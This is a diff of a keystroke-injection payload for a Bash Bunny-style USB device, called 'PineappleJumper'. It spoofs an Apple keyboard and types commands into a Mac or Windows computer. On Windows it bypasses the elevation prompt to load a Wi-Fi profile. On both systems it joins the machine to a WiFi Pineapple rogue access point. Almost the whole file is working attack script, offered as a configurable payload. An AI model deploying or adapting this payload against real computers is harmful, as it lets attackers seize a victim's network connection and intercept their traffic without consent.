@@ -1,24 +1,62 @@
 # Title: 	PineappleJumper
 # Author: 	PuggosTheDuck
-# Version:	1.0
+# Version:	2.0
 #
-# Manipulates the Mac laptop to change wifi to the WifiPinapple
+# Manipulates a Mac or Windows computer to change its wifi to the WifiPinapple
 #
 # Amber..............Executing payload
 # Green..............Finished
 #
 
-ATTACKMODE HID VID_0X05AC PID_0X021E
+ATTACKMODE HID STORAGE VID_0X05AC PID_0X021E
+#Please Input Mac/Windows for OS
+
+OS=[Input Here]
+
+if [ $OS == "Mac" ];
+then
 DELAY 1000
 Q GUI SPACE
 DELAY 1000
 Q STRING terminal
+Q DELAY 1000
 Q ENTER
-DELAY 1000
+Q DELAY 1000
 Q STRING cd /
-DELAY 1000
-Q STRING /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
-DELAY 1000
-#Please Enter you WiFi at the end of en0 and you password if you have one
-Q STRING networksetup -setairportnetwork en0 <Your Wifi SSID> <PASSWORD>
 Q ENTER
+Q DELAY 1000
+Q STRING cd /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources
+Q ENTER
+Q DELAY 1000
+#Please Enter you Wi-Fi at the end of en0 and you password if you have one
+Q STRING networksetup -setairportnetwork en0 [SSID] [PASSWORD]
+Q DELAY 1000
+Q ENTER
+elif [ $OS == "Windows" ];
+then
+Q DELAY 1000
+Q GUI r
+Q DELAY 1000
+Q STRING cmd
+Q DELAY 1000
+Q CTRL-SHIFT ENTER
+Q DELAY 1000
+Q LEFTARROW
+Q DELAY 1000
+Q ENTER
+Q DELAY 1000
+# Please Enter in your switch slot and your xml file
+Q STRING netsh wlan add profile filename="D:\payloads\[SWITCH]\[.xml file]"
+Q DELAY 1000
+Q ENTER
+Q DELAY 1000
+# Please Enter in your switch slot and your xml file
+Q STRING netsh wlan add profile filename="E:\payloads\[SWITCH]\[.xml file]"
+Q ENTER
+Q DELAY 1000
+# Please enter in the name of the Wi-Fi and the SSID
+Q STRING netsh wlan connect name=[NAME OF WI-FI] ssid=[SSID] interface=Wi-Fi
+Q ENTER
+Q STRING exit
+Q ENTER
+fi
